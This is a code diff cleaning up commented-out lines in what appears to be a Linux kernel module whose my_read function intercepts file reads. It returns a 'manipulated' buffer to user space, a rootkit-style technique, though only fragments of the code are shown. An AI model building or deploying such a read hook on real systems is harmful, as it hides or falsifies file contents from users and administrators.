@@ -20,36 +20,19 @@ my_read(unsigned int fd, char *buf, size_t count) {
 
 	struct file *file;
 
-	//u64 file_inode;
-	//dev_t file_dev;
-	//umode_t file_mode;
-	//loff_t file_size;
-	//int r;
 	
-	//char* file_name;
 	char *ptr1, *ptr2, *ptr3;
 	int i, buf_len_to_copy;
-	//int tampered_fd;
 	
 	char* abs_path;
 	char *tmp, *buf2;
-	//loff_t pos, tampered_pos;
 	
-	//struct kstat file_ksp;
 	struct path file_path;
-	//file_dev = file_ksp.dev;
-	//file_mode = file_ksp.mode;
-	//file_size = file_ksp.size;
-	//mm_segment_t prev_fs;
 	unsigned long ret;
 	
 	file = fget(fd);
 	
 	if (file) {
-		// Get the file name and its inode
-		//file_name = file->f_path.dentry->d_name.name;
-		//r = vfs_stat(file_name, &file_ksp);
-		//file_inode = file_ksp.ino;
 		
 		// Get the absolute path of current file
 		file_path = file->f_path;
@@ -100,27 +83,6 @@ my_read(unsigned int fd, char *buf, size_t count) {
 			
 			if (DEBUG == 1) 
 				printk("[BufSize after manipulation]: %ld\n", strlen(buf2));
-			
-			/*
-			// Get the current FS segment descriptor
-			prev_fs = get_fs();
-			// Set the segment descriptor in kernel
-			set_fs(KERNEL_DS);
-			
-			tampered = filp_open(tmp_tampered, O_WRONLY|O_CREAT, 0644);
-			
-			vfs_write(tampered, buf, strlen(buf), &tampered->f_pos);
-			filp_close(tampered, NULL);
-			//tampered_fd = original_open(tampered, O_RDONLY, 0);
-			
-			// Reset the segment descriptor
-			set_fs(prev_fs);
-			
-			tampered_pos = tampered->f_pos;
-			ret = vfs_read(tampered, buf2, strlen(buf), &tampered->f_pos);
-			tampered->f_pos = tampered_pos;
-			fput(tampered);
-			*/
 			
 			// Copy the altered string to user space
 			copy_to_user(buf, buf2, ret);
